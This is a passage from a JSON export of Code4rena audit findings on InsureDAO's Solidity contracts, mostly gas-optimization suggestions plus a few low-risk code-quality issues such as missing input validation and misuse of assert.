external functions where the function argument is read-only.", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/64", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   On external functions, when using the `memory` keyword with a function argument, what's happening is that a `memory` acts as an intermediate.      Reading directly from `calldata` using `calldataload` instead of going via `memory` saves the gas from the intermediate memory operations that carry the values.      As an extract from https://ethereum.stackexchange.com/questions/74442/when-should-i-use-calldata-and-when-should-i-use-memory :   > `memory` and `calldata` (as well as `storage`) are keywords that define the data area where a variable is stored. To answer your question directly, `memory` should be used when declaring variables (both function parameters as well as inside the logic of a function) that you want stored in memory (temporary), and `calldata` _must_ be used when declaring an **external** function's **dynamic** parameters. The easiest way to think about the difference is that `calldata` is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory.      ## Proof of Concept   ```   Vault.sol:92:        address[2] memory _beneficiaries, Vault.sol:93:        uint256[2] memory _shares ```      ## Tools Used   VS Code      ## Recommended Mitigation Steps   Use `calldata` instead of `memory` for external functions where the function argument is read-only.   "}, {"title": "Gas: Unused Named Returns", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/63", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Using both named returns and a return statement isn't necessary. Removing unused named return variables can reduce gas usage and improve code clarity. To save gas and improve code quality: consider using only one of those.      ## Proof of Concept   Instances include:   ``` CDSTemplate.sol:287:    function totalLiquidity() public view returns (uint256 _balance) { IndexTemplate.sol:491:    function leverage() public view returns (uint256 _rate) { IndexTemplate.sol:504:    function totalLiquidity() public view returns (uint256 _balance) { PoolTemplate.sol:628:        returns (uint256 premium) PoolTemplate.sol:833:        returns (uint256 _balance) PoolTemplate.sol:846:    function utilizationRate() public view override returns (uint256 _rate) { PoolTemplate.sol:858:    function totalLiquidity() public view override returns (uint256 _balance) { PoolTemplate.sol:866:    function originalLiquidity() public view returns (uint256 _balance) { ```     ## Tools Used   VS Code      ## Recommended Mitigation Steps   Remove the unused named returns   "}, {"title": "Gas: Usage of a non-native 256 bits uint as a counter in for-loops increases gas cost", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/62", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Due to how the EVM natively works on 256 bit numbers, using a 8 bit number in for-loops introduces additional costs as the EVM has to properly enforce the limits of this smaller type.  See the warning at this link: https://docs.soliditylang.org/en/v0.8.0/internals/layout_in_storage.html#layout-of-state-variables-in-storage : > When using elements that are smaller than 32 bytes, your contract\u2019s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. > It is only beneficial to use reduced-size arguments if you are dealing with storage values because the compiler will pack multiple elements into one storage slot, and thus, combine multiple reads or writes into a single operation. When dealing with function arguments or memory values, there is no inherent benefit because the compiler does not pack these values.    ## Proof of Concept   ``` Vault.sol:109:        for (uint128 i = 0; i < 2; i++) { ```  ## Tools Used   VS Code      ## Recommended Mitigation Steps   Use `uint256` as a counter in for-loops.   "}, {"title": "Gas optimization in PoolTemplate.withdraw()", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/59", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  tqts   # Vulnerability details  ## Impact None  ## Proof of Concept The `withdrawalReq[msg.sender].timestamp` and `parameters.getLockup(msg.sender)` values are used twice in the `require` statements, and both times summed.   ## Tools Used Manual review  ## Recommended Mitigation Steps Cache the sum value in a new variable. I've sent a similar report for IndexTemplate.withdraw() with a similar issue.  "}, {"title": "Gas optimization in IndexTemplate.requestWithdraw()", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/56", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  tqts   # Vulnerability details  ## Impact None  ## Proof of Concept In [L197](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L197) of IndexTemplate, a `_balance` variable is created and initialized to the balance of `msg.sender`. However that variable is used only once in the function.  ## Tools Used Manual review  ## Recommended Mitigation Steps Replace L198 with `require(balanceOf(msg.sender) >= _amount, \"ERROR: REQUEST_EXCEED_BALANCE\");` and remove L197  "}, {"title": "Update to solc-0.8.10+", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/47", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact Gas costs  ## Proof of Concept  Solidity 0.8.10 has a useful change which reduced gas costs of external calls which expect a return value: https://blog.soliditylang.org/2021/11/09/solidity-0.8.10-release-announcement/  > Code Generator: Skip existence check for external contract if return data is expected. In this case, the ABI decoder will revert if the contract does not exist  InsureDAO is using 0.8.7:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L8  Updating to the newer version of solc will allow InsureDAO to take advantage of these lower costs for external calls.  ## Recommended Mitigation Steps  Update to solc 0.8.10 or above  "}, {"title": "Parameters.sol lacks input validation", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/44", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  cccz   # Vulnerability details  ## Impact When setting parameters in the Parameters contract, the input parameters are not verified.  For example, in the setFeeRate function, the _target parameter is not limited. When _target is greater than 1e6, DOS will occur when used in the insure function of the PoolTemplate contract ```     function setFeeRate(address _address, uint256 _target)         external         override         onlyOwner     {         _fee[_address] = _target;         emit FeeRateSet(_address, _target);     }    ...    function insure(         uint256 _amount,         uint256 _maxCost,         uint256 _span,         bytes32 _target     ) external returns (uint256) {         //Distribute premium and fee         uint256 _endTime = _span + block.timestamp;         uint256 _premium = getPremium(_amount, _span);         uint256 _fee = parameters.getFeeRate(msg.sender);          require(             _amount <= availableBalance(),             \"ERROR: INSURE_EXCEEDED_AVAILABLE_BALANCE\"         );         require(_premium <= _maxCost, \"ERROR: INSURE_EXCEEDED_MAX_COST\");         require(_span <= 365 days, \"ERROR: INSURE_EXCEEDED_MAX_SPAN\");         require(             parameters.getMinDate(msg.sender) <= _span,             \"ERROR: INSURE_SPAN_BELOW_MIN\"         );          require(             marketStatus == MarketStatus.Trading,             \"ERROR: INSURE_MARKET_PENDING\"         );         require(paused == false, \"ERROR: INSURE_MARKET_PAUSED\");          //current liquidity         uint256 _liquidity = totalLiquidity();         uint256 _totalCredit = totalCredit;          //accrue premium/fee         uint256[2] memory _newAttribution = vault.addValueBatch(             _premium,             msg.sender,             [address(this), parameters.getOwner()],             [MAGIC_SCALE_1E6-_fee, _fee]         ); ``` ## Proof of Concept  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol  ## Tools Used  Manual analysis   ## Recommended Mitigation Steps  When setting parameters in the Parameters contract, verify the input parameters  "}, {"title": "Gas: An array's length should be cached to save gas in for-loops", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/43", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.      Caching the array length in the stack saves around 3 gas per iteration.      ## Proof of Concept   ```   Factory.sol:176:            for (uint256 i = 0; i < _references.length; i++) { Factory.sol:186:            for (uint256 i = 0; i < _conditions.length; i++) { IndexTemplate.sol:655:        for (uint256 i = 0; i < poolList.length; i++) { PoolTemplate.sol:343:        for (uint256 i = 0; i < _ids.length; i++) { PoolTemplate.sol:671:        for (uint256 i = 0; i < indexList.length; i++) { PoolTemplate.sol:703:        for (uint256 i = 0; i < indexList.length; i++) { ```   ## Tools Used   VS Code      ## Recommended Mitigation Steps   Store the array's length in a variable before the for-loop, and use it instead.   "}, {"title": "Redundant if statements in market deployment function", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/41", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact gas costs  ## Proof of Concept  Here if the lengths of these arrays are zero we'll fall straight through the for loops so there's no need for the if statements.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L175-L191  ## Recommended Mitigation Steps  Remove if statements  "}, {"title": "Gas: No need to initialize variables with default values", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/40", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   If a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.    ## Proof of Concept   Instances include:   ```   Factory.sol:176:            for (uint256 i = 0; i < _references.length; i++) { Factory.sol:186:            for (uint256 i = 0; i < _conditions.length; i++) { IndexTemplate.sol:280:            for (uint256 i = 0; i < _length; i++) { IndexTemplate.sol:348:        for (uint256 i = 0; i < _length; i++) { IndexTemplate.sol:381:        for (uint256 i = 0; i < _length; i++) { IndexTemplate.sol:462:        for (uint256 i = 0; i < _poolLength; i++) { IndexTemplate.sol:655:        for (uint256 i = 0; i < poolList.length; i++) { PoolTemplate.sol:343:        for (uint256 i = 0; i < _ids.length; i++) { PoolTemplate.sol:671:        for (uint256 i = 0; i < indexList.length; i++) { PoolTemplate.sol:703:        for (uint256 i = 0; i < indexList.length; i++) { Vault.sol:109:        for (uint128 i = 0; i < 2; i++) { ```      ## Tools Used   Manual Analysis      ## Recommended Mitigation Steps   Remove explicit initialization for default values.   "}, {"title": "Redundant tracking of markets in factory", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/39", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  Gas costs  ## Proof of Concept  Here we push a new market onto an array in the factory whilst we just added the market to the registry.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L214-L216  ## Recommended Mitigation Steps  This array on the factory seems redundant and so it can be removed.  "}, {"title": "Gas: SafeMath is not needed when using Solidity version 0.8.*", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/38", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Increased gas cost      ## Proof of Concept   Solidity version 0.8.* already implements overflow and underflow checks by default.  Using the SafeMath library from OpenZeppelin (which is more gas expensive than the 0.8.* overflow checks) is therefore redundant.      Instances include:  ```   mocks\\ERC20.sol:4:import \"@openzeppelin/contracts/utils/math/SafeMath.sol\"; mocks\\ERC20.sol:30:    using SafeMath for uint256; mocks\\TestPremiumModel.sol:3:import \"@openzeppelin/contracts/utils/math/SafeMath.sol\"; mocks\\TestPremiumModel.sol:7:    using SafeMath for uint256; PremiumModels\\BondingPremium.sol:10:import \"@openzeppelin/contracts/utils/math/SafeMath.sol\"; ```      ## Tools Used   VS Code      ## Recommended Mitigation Steps   Use the built-in checks instead of SafeMath and remove SafeMath from the dependencies   "}, {"title": "allocatedCredit and availableBalance are always read together so should be returned together.", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/37", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  Gas costs  ## Proof of Concept  It seems that we always want to get a pool's `allocatedCredit` and `availableBalance` together, suggesting that these values are tightly coupled.   https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L284-L287  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L356-L360  If we're regularly going to be requesting these values together it may be worth considering having a single function in the pool template which returns both of these values. This would save gas costs of performing an extra external call to the pool contract.  ## Recommended Mitigation Steps  Consider having a function which returns both of these values to avoid repeated calls into the same contract for related info.  "}, {"title": "Gas: `> 0` is less efficient than `!= 0` for unsigned integers", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/36", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   `!= 0` costs less gas compared to `> 0` for unsigned integer      ## Proof of Concept   `> 0` is used in the following location(s): ```   CDSTemplate.sol:100:                bytes(_metaData).length > 0 && CDSTemplate.sol:132:        require(_amount > 0, \"ERROR: DEPOSIT_ZERO\"); CDSTemplate.sol:140:        if (_supply > 0 && _liquidity > 0) { CDSTemplate.sol:142:        } else if (_supply > 0 && _liquidity == 0) { CDSTemplate.sol:191:        require(_amount > 0, \"ERROR: REQUEST_ZERO\"); CDSTemplate.sol:223:        require(_amount > 0, \"ERROR: WITHDRAWAL_ZERO\"); CDSTemplate.sol:296:        if (totalSupply() > 0) { Factory.sol:175:        if (_references.length > 0) { Factory.sol:185:        if (_conditions.length > 0) { Factory.sol:187:                if (conditionlist[address(_template)][i] > 0) { IndexTemplate.sol:133:                bytes(_metaData).length > 0 && IndexTemplate.sol:166:        require(_amount > 0, \"ERROR: DEPOSIT_ZERO\"); IndexTemplate.sol:172:        if (_supply > 0 && _totalLiquidity > 0) { IndexTemplate.sol:174:        } else if (_supply > 0 && _totalLiquidity == 0) { IndexTemplate.sol:199:        require(_amount > 0, \"ERROR: REQUEST_ZERO\"); IndexTemplate.sol:231:        require(_amount > 0, \"ERROR: WITHDRAWAL_ZERO\"); IndexTemplate.sol:246:        if (_liquidityAfter > 0) { IndexTemplate.sol:274:        if(_totalLiquidity > 0){ IndexTemplate.sol:283:                if (_allocPoint > 0) { IndexTemplate.sol:391:                if (_current > _target && _available != 0) { IndexTemplate.sol:427:            allocPoints[msg.sender] > 0, IndexTemplate.sol:477:        require(allocPoints[msg.sender] > 0); IndexTemplate.sol:493:        if (totalLiquidity() > 0) { IndexTemplate.sol:513:        if (totalSupply() > 0) { IndexTemplate.sol:612:        if (totalAllocPoint > 0) { IndexTemplate.sol:656:            if (allocPoints[poolList[i]] > 0) { InsureDAOERC20.sol:302:        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\"); Parameters.sol:31:    mapping(address => uint256) private _fee; //fee rate in 1e6 (100% = 1e6) PoolTemplate.sol:185:                bytes(_metaData).length > 0 && PoolTemplate.sol:218:        if (_conditions[1] > 0) { PoolTemplate.sol:237:        require(_amount > 0, \"ERROR: DEPOSIT_ZERO\"); PoolTemplate.sol:263:        require(_amount > 0, \"ERROR: DEPOSIT_ZERO\"); PoolTemplate.sol:282:        require(_amount > 0, \"ERROR: REQUEST_ZERO\"); PoolTemplate.sol:321:        require(_amount > 0, \"ERROR: WITHDRAWAL_ZERO\"); PoolTemplate.sol:391:        } else if (_index.credit > 0) { PoolTemplate.sol:396:            if (_pending > 0) { PoolTemplate.sol:401:        if (_credit > 0) { PoolTemplate.sol:437:        if (_credit > 0) { PoolTemplate.sol:444:        if (_pending > 0) { PoolTemplate.sol:521:        if (_totalCredit > 0) { PoolTemplate.sol:672:            if (indicies[indexList[i]].credit > 0) { PoolTemplate.sol:706:            if (_credit > 0) { PoolTemplate.sol:726:        if (_deductionFromPool > 0) { PoolTemplate.sol:745:        if (totalSupply() > 0) { PoolTemplate.sol:802:        if (_supply > 0 && _originalLiquidity > 0) { PoolTemplate.sol:804:        } else if (_supply > 0 && _originalLiquidity == 0) { PoolTemplate.sol:835:        if (totalLiquidity() > 0) { PoolTemplate.sol:847:        if (lockedAmount > 0) { PoolTemplate.sol:929:        require(b > 0); Vault.sol:154:            attributions[msg.sender] > 0 && Vault.sol:187:            attributions[msg.sender] > 0 && Vault.sol:220:            attributions[msg.sender] > 0 && Vault.sol:347:        if (_amount > 0) { Vault.sol:388:        if (totalAttributions > 0 && _attribution > 0) { Vault.sol:406:        if (attributions[_target] > 0) { Vault.sol:473:        } else if (IERC20(_token).balanceOf(address(this)) > 0) { ```      ## Tools Used   VS Code      ## Recommended Mitigation Steps   Change `> 0` with `!= 0`.   "}, {"title": "Unnecessary market status check on redemption", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/32", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  gas costs  ## Proof of Concept  Here on L563 we check the market status however we have already done this on L558  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L557-L567  ## Recommended Mitigation Steps  Remove redundant check (check other market templates as well)  "}, {"title": "Skip balance check in _beforeTokenTransfer if no withdrawalRequest exists", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/31", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  Gas costs  ## Proof of Concept  When transferring any of the market tokens, a check is performed to see if they have a pending withdrawal and reduce it if their balance falls below the requested amount.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L910-L923  In the case where a user has no pending withdrawal we then perform an unnecessary check on their balance. We could save an SLOAD by changing it to the below  ``` if (from != address(0)) {     uint256 reqAmount = withdrawalReq[from].amount     if (reqAmount > 0){         uint256 _after = balanceOf(from) - amount;         if (_after < reqAmount) {             withdrawalReq[from].amount = _after;         }     }  } ```  ## Recommended Mitigation Steps  As above  "}, {"title": "Gas: Consider making some constants as non-public to save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/30", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Reducing from public to private will save gas    ## Proof of Concept   ```   PremiumModels\\BondingPremium.sol:26:    //constants PremiumModels\\BondingPremium.sol:27:    uint256 public constant DECIMAL = uint256(1e6); //Decimals of USDC PremiumModels\\BondingPremium.sol:28:    uint256 public constant BASE = uint256(1e6); //bonding curve graph takes 1e6 as 100.0000% PremiumModels\\BondingPremium.sol:29:    uint256 public constant BASE_x2 = uint256(1e12); //BASE^2 PremiumModels\\BondingPremium.sol:30:    uint256 public constant ADJUSTER = uint256(10); //adjuster of 1e6 to 1e5 (100.0000% to 100.000%) CDSTemplate.sol:55:    uint256 public constant MAGIC_SCALE_1E6 = 1e6; //internal multiplication scale 1e6 to reduce decimal truncation IndexTemplate.sol:95:    uint256 public constant MAGIC_SCALE_1E6 = 1e6; //internal multiplication scale 1e6 to reduce decimal truncation PoolTemplate.sol:146:    uint256 public constant MAGIC_SCALE_1E6 = 1e6; //internal multiplication scale 1e6 to reduce decimal truncation Vault.sol:38:    uint256 public constant MAGIC_SCALE_1E6 = 1e6; //internal multiplication scale 1e6 to reduce decimal truncation ```   ## Tools Used   VS Code      ## Recommended Mitigation Steps   Theses constants can simply be read from the verified contract, i.e., it is unnecessary to expose it with a public function. Also, constants having \"1E6\" in their name aren't even \"nice to have public constants\", as their value is obvious.   "}, {"title": "Withdrawal struct can be packed to save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/27", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact Detailed description of the impact of this finding.  ## Proof of Concept  The `Withdrawal` struct in `IndexTemplate.sol` contains a timestamp and the amount of tokens which the user requests to withdraw.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L81-L84  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L198  If we make the safe assumption that the user's balance does not exceed 2^192 then we can pack this struct into a single storage slot to save an SLOAD by changing the definition to:  ``` struct Withdrawal {     uint64 timestamp;     uint192 amount; } ```  ## Recommended Mitigation Steps  As above  "}, {"title": "sqrt can be made unchecked to save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/26", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  gas costs  ## Proof of Concept  In the sqrt function it is known that the while loop will not overflow so it can be safely left unchecked to save gas.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PremiumModels/BondingPremium.sol#L238-L245  ```     function sqrt(uint256 x) internal pure returns (uint256 y) {         uint256 z = (x + 1) / 2;         unchecked {             y = x;             while (z < y) {                 y = z;                 z = (x / z + z) / 2;             }         }     } ``` ## Recommended Mitigation Steps  wrap entire function body in a unchecked block as above  "}, {"title": "Assert instead require to validate user inputs", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/21", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  robee   # Vulnerability details  From solidity docs: Properly functioning code should never reach a failing assert statement; if this happens there is a bug in your contract which you should fix. With assert the user pays the gas and with require it doesn't. The ETH network gas isn't cheap and users can see it as a scam.  You have reachable asserts in the following locations (which should be replaced by require / are mistakenly left from development phase):          InsureDAOERC20.sol : reachable assert in line 31         Vault.sol : reachable assert in line 167   "}, {"title": "Named return issue", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/18", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  robee   # Vulnerability details  Users can mistakenly think that the return value is the named return, but it is actually the actualreturn statement that comes after. To know that the user needs to read the code and is confusing. Furthermore, removing either the actual return or the named return will save gas.           CDSTemplate.sol, totalLiquidity         Factory.sol, _createClone         IndexTemplate.sol, withdrawable         IndexTemplate.sol, leverage         IndexTemplate.sol, totalLiquidity         PoolTemplate.sol, availableBalance         PoolTemplate.sol, utilizationRate         PoolTemplate.sol, totalLiquidity  "}, {"title": "Require with empty message", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/15", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  robee   # Vulnerability details  The following requires are with empty messages.  This is very important to add a message for any require. Such that the user has enough  information to know the reason of failure:           Solidity file: CDSTemplate.sol, In line 253 with Empty Require message.         Solidity file: Factory.sol, In line 100 with Empty Require message.         Solidity file: IndexTemplate.sol, In line 477 with Empty Require message.         Solidity file: PoolTemplate.sol, In line 929 with Empty Require message.         Solidity file: Vault.sol, In line 66 with Empty Require message.         Solidity file: Vault.sol, In line 67 with Empty Require message.         Solidity file: Vault.sol, In line 68 with Empty Require message.   "}, {"title": "Check if amount is not zero to save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/13", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  robee   # Vulnerability details  The following functions could skip other steps if the amount is 0. (A similar issue: https://github.com/code-423n4/2021-10-badgerdao-findings/issues/82)           InsureDAOERC20.sol, name         InsureDAOERC20.sol, symbol         InsureDAOERC20.sol, decimals         InsureDAOERC20.sol, totalSupply         InsureDAOERC20.sol, balanceOf         InsureDAOERC20.sol, transfer         InsureDAOERC20.sol, allowance         InsureDAOERC20.sol, approve         InsureDAOERC20.sol, transferFrom         InsureDAOERC20.sol, increaseAllowance         InsureDAOERC20.sol, decreaseAllowance         InsureDAOERC20.sol, _transfer         InsureDAOERC20.sol, _mint         InsureDAOERC20.sol, _burn         InsureDAOERC20.sol, _approve         InsureDAOERC20.sol, _beforeTokenTransfer         InsureDAOERC20.sol, _afterTokenTransfer  "}, {"title": "Public functions to external", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/7", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  robee   # Vulnerability details  The following functions could be set external to save gas and improve code quality.  External call cost is less expensive than of public functions.           The function totalLiquidity in CDSTemplate.sol could be set external         The function valueOfUnderlying in CDSTemplate.sol could be set external         The function createMarket in Factory.sol could be set external         The function totalLiquidity in IndexTemplate.sol could be set external         The function set in IndexTemplate.sol could be set external         The function leverage in IndexTemplate.sol could be set external         The function withdrawable in IndexTemplate.sol could be set external         The function valueOfUnderlying in IndexTemplate.sol could be set external         The function deposit in IndexTemplate.sol could be set external         The function adjustAlloc in IndexTemplate.sol could be set external         The function allowance in InsureDAOERC20.sol could be set external         The function decimals in InsureDAOERC20.sol could be set external         The function totalSupply in InsureDAOERC20.sol could be set external         The function name in InsureDAOERC20.sol could be set external         The function transfer in InsureDAOERC20.sol could be set external         The function increaseAllowance in InsureDAOERC20.sol could be set external         The function transferFrom in InsureDAOERC20.sol could be set external         The function decreaseAllowance in InsureDAOERC20.sol could be set external         The function balanceOf in InsureDAOERC20.sol could be set external         The function symbol in InsureDAOERC20.sol could be set external         The function approve in InsureDAOERC20.sol could be set external         The function getOwner in Parameters.sol could be set external         The function utilizationRate in PoolTemplate.sol could be set external         The function totalLiquidity in PoolTemplate.sol could be set external         The function availableBalance in PoolTemplate.sol could be set external         The function getPremium in PoolTemplate.sol could be set external         The function valueOfUnderlying in PoolTemplate.sol could be set external         The function unlock in PoolTemplate.sol could be set external         The function originalLiquidity in PoolTemplate.sol could be set external         The function deposit in PoolTemplate.sol could be set external         The function allocatedCredit in PoolTemplate.sol could be set external         The function getPremiumRate in BondingPremium.sol could be set external         The function getCurrentPremiumRate in BondingPremium.sol could be set external         The function getPricePerFullShare in Vault.sol could be set external         The function valueAll in Vault.sol could be set external         The function setController in Vault.sol could be set external         The function underlyingValue in Vault.sol could be set external   "}, {"title": "Storage double reading. Could save SLOAD", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/5", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  robee   # Vulnerability details  Reading a storage variable is gas costly (SLOAD). In cases of multiple read of a storage variable in the same scope, caching the first read (i.e saving as a local variable) can save gas and decrease the  overall gas uses. The following is a list of functions and the storage variables that you read twice:           CDSTemplate.sol: parameters.getLockup is read twice in withdraw         Factory.sol: registry is read twice in createMarket         IndexTemplate.sol: totalAllocPoint is read twice in set         IndexTemplate.sol: MAGIC_SCALE_1E6 is read twice in withdrawable         PoolTemplate.sol: parameters.getLockup is read twice in withdraw         PoolTemplate.sol: lockedAmount is read twice in utilizationRate         PoolTemplate.sol: MAGIC_SCALE_1E6 is read twice in allocateCredit         PoolTemplate.sol: MAGIC_SCALE_1E6 is read twice in withdrawCredit         PoolTemplate.sol: MAGIC_SCALE_1E6 is read twice in insure         PoolTemplate.sol: MAGIC_SCALE_1E6 is read twice in resume         BondingPremium.sol: k is read twice in getCurrentPremiumRate         BondingPremium.sol: k is read twice in getPremiumRate         BondingPremium.sol: c is read twice in getPremiumRate         BondingPremium.sol: b is read twice in getCurrentPremiumRate         BondingPremium.sol: b is read twice in getPremiumRate         BondingPremium.sol: T_1 is read twice in getCurrentPremiumRate         BondingPremium.sol: T_1 is read twice in getPremiumRate         BondingPremium.sol: BASE is read twice in getCurrentPremiumRate         BondingPremium.sol: BASE is read twice in getPremiumRate         BondingPremium.sol: BASE_x2 is read twice in getCurrentPremiumRate         BondingPremium.sol: BASE_x2 is read twice in getPremiumRate         Vault.sol: token is read twice in repayDebt         Vault.sol: token is read twice in utilize         Vault.sol: token is read twice in withdrawRedundant         Vault.sol: totalAttributions is read twice in attributionValue         Vault.sol: balance is read twice in valueAll         Vault.sol: balance is read twice in withdrawRedundant   "}, {"title": "Unused state variables", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/3", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  robee   # Vulnerability details  Unused state variables are gas consuming at deployment (since they are located in storage) and are  a bad code practice. Removing those variables will decrease deployment gas cost and improve code quality.  This is a full list of all the unused storage variables we found in your code base.  The format is <solidity file>, <unused storage variable name>:           IndexTemplate.sol, pendingEnd         BondingPremium.sol, ADJUSTER   "}, {"title": "Unused imports", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/1", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  robee   # Vulnerability details  In the following files there are contract imports that aren't used.  Import of unnecessary files costs deployment gas (and is a bad coding practice that is important to ignore).  The following is a full list of all unused imports, we went through the whole code to find it :) <solidity file> <line number> <actual import line>:           Factory.sol, line 13, import \"hardhat/console.sol\";         IndexTemplate.sol, line 6, import \"hardhat/console.sol\";         Parameters.sol, line 12, import \"hardhat/console.sol\";         BondingPremium.sol, line 9, import 